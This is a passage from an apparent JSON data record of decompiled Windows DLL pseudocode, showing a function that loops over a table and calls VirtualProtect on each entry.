puVar1);\ncode_r0x6bac1f20:\n    pcVar15 = _sym.imp.KERNEL32.dll_VirtualProtect;\n    ppuVar10 = *0x6bb0a5e4;\n    if (0 < *0x6bb0a5e4) {\n        iVar9 = 0;\n        do {\n            ppuVar10 = *0x6bb0a5e8 + iVar9;\n            iVar4 = *ppuVar10;\n            if (iVar4 != 0) {\n                puVar5 = ppuVar10[2];\n                puVar6 = ppuVar10[1];\n                *(auStack320 + iVar11) = 0x6bac1f60;\n                ppuVar10 = (*pcVar15)(puVar6, puVar5, iVar4, apuStack272);\n            }\n            iVar16 = iVar16 + 1;\n            iVar9 = iVar9 + 0x28;\n        } while (iVar16 < *0x6bb0a5e4);\n    }\n    return ppuVar10;\n}\n",
        "token_count": 4226
    }
}